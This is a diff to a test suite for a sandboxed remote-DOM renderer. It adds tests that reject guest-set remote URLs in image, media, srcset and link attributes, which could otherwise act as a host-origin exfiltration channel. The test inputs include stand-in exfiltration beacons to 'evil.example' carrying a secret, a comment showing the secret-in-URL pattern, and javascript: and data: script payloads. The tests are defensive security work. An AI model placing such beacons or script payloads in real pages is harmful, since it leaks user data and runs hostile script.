@@ -216,14 +216,18 @@ describe('RemoteDomHost — SECURITY: attribute allowlist blocks event handlers'
     expect(el!.getAttribute('href')).toBeNull();
   });
 
-  it('ALLOWS safe href attribute', () => {
+  it('ALLOWS a same-origin/relative href (§9 rule 3: local only; remote origins are REJECTED)', () => {
+    // NOTE: this test previously asserted a REMOTE `https://example.com` href IS set —
+    // that encoded the §9-rule-3 exfil bug (RemoteDomHost renders in the HOST page,
+    // outside any iframe CSP, so a remote href/src is a host-origin GET the CSP work
+    // cannot stop). Corrected to a same-origin/relative href, which is safe and allowed.
     host.applyMutations([
       { type: 'createElement', id: 34, tag: 'a' },
-      { type: 'setAttribute', id: 34, name: 'href', value: 'https://example.com' },
+      { type: 'setAttribute', id: 34, name: 'href', value: '/local/page' },
       { type: 'appendChild', parentId: 0, childId: 34 },
     ]);
     const el = container.querySelector('a');
-    expect(el!.getAttribute('href')).toBe('https://example.com');
+    expect(el!.getAttribute('href')).toBe('/local/page');
   });
 
   it('ALLOWS class and id attributes', () => {
@@ -479,6 +483,107 @@ describe('RemoteDomHost — SECURITY: dangerous URI schemes blocked', () => {
       { type: 'appendChild', parentId: 0, childId: 3 },
     ]);
     expect(container.querySelector('img')!.getAttribute('src')).toBeNull();
+  });
+});
+
+describe('RemoteDomHost — SECURITY §9 rule 3: URL-bearing attrs reject remote origins (host-side GET-exfil)', () => {
+  // RemoteDomHost runs in the HOST page, OUTSIDE any iframe CSP; the Lab drives it
+  // over a host-page container with no page CSP. A guest setting an img/media src (or
+  // href/poster/srcset) to a REMOTE origin would make the browser GET from the HOST
+  // origin — a covert exfil channel (`src = 'https://evil/?'+secret`) that connect-src
+  // 'none' inside the iframe cannot stop. So only LOCAL values are allowed here:
+  // blob:, data: (passive, inert), and same-origin/relative paths. Remote is REJECTED.
+  let container: HTMLDivElement;
+  let host: RemoteDomHost;
+
+  beforeEach(() => {
+    container = makeContainer();
+    host = new RemoteDomHost({ container });
+  });
+  afterEach(() => {
+    host.dispose();
+    cleanupContainer(container);
+  });
+
+  function setSrc(tag: string, name: string, value: string): string | null {
+    const id = Math.floor(Math.random() * 1e6) + 1;
+    host.applyMutations([
+      { type: 'createElement', id, tag },
+      { type: 'setAttribute', id, name, value },
+      { type: 'appendChild', parentId: 0, childId: id },
+    ]);
+    return (container.querySelector(tag) as Element | null)?.getAttribute(name) ?? null;
+  }
+
+  it('REJECTS a remote https: img src (exfil channel)', () => {
+    expect(setSrc('img', 'src', 'https://evil.example/beacon?secret=1')).toBeNull();
+  });
+
+  it('REJECTS a remote http: img src', () => {
+    expect(setSrc('img', 'src', 'http://evil.example/x')).toBeNull();
+  });
+
+  it('REJECTS a protocol-relative //host img src', () => {
+    expect(setSrc('img', 'src', '//evil.example/x')).toBeNull();
+  });
+
+  it('REJECTS a remote video poster', () => {
+    expect(setSrc('video', 'poster', 'https://evil.example/p.png')).toBeNull();
+  });
+
+  it('REJECTS a remote source src', () => {
+    expect(setSrc('source', 'src', 'https://evil.example/a.mp4')).toBeNull();
+  });
+
+  it('REJECTS a remote a href (was ALLOWED — that test encoded the exfil bug)', () => {
+    expect(setSrc('a', 'href', 'https://example.com')).toBeNull();
+  });
+
+  it('REJECTS an xlink:href to a remote origin', () => {
+    // xlink:href is already in the URL-attr scheme block; extend to remote origins.
+    const id = 4242;
+    host.applyMutations([
+      { type: 'createElement', id, tag: 'img' },
+      { type: 'setAttribute', id, name: 'xlink:href', value: 'https://evil.example/x' },
+      { type: 'appendChild', parentId: 0, childId: id },
+    ]);
+    expect(container.querySelector('img')!.getAttribute('xlink:href')).toBeNull();
+  });
+
+  it('REJECTS a srcset where ANY candidate is remote', () => {
+    // Comma-separated `url descriptor` candidates; one remote candidate poisons all.
+    expect(setSrc('img', 'srcset', 'blob:local1 1x, https://evil.example/2x.png 2x')).toBeNull();
+  });
+
+  it('ALLOWS a blob: img src (guest-produced local asset — first-party apps rely on this)', () => {
+    const v = setSrc('img', 'src', 'blob:https://null/abc-123');
+    expect(v).toBe('blob:https://null/abc-123');
+  });
+
+  it('ALLOWS a data: img src (passive, inert content — matches §5 img-src data: allowance)', () => {
+    const v = 'data:image/png;base64,iVBORw0KGgo=';
+    expect(setSrc('img', 'src', v)).toBe(v);
+  });
+
+  it('ALLOWS a relative img src (same-origin path, not remote)', () => {
+    expect(setSrc('img', 'src', '/assets/local.png')).toBe('/assets/local.png');
+  });
+
+  it('ALLOWS a bare relative img src (no scheme, no leading //)', () => {
+    expect(setSrc('img', 'src', 'local.png')).toBe('local.png');
+  });
+
+  it('ALLOWS a srcset where ALL candidates are local (blob:/relative)', () => {
+    const v = 'blob:https://null/a 1x, /b.png 2x';
+    expect(setSrc('img', 'srcset', v)).toBe(v);
+  });
+
+  it('still REJECTS a javascript: href (scheme block preserved)', () => {
+    expect(setSrc('a', 'href', 'javascript:alert(1)')).toBeNull();
+  });
+
+  it('still REJECTS a data: HREF on <a> (data: allowed for img src, NOT for navigational href)', () => {
+    expect(setSrc('a', 'href', 'data:text/html,<script>alert(1)</script>')).toBeNull();
   });
 });
 
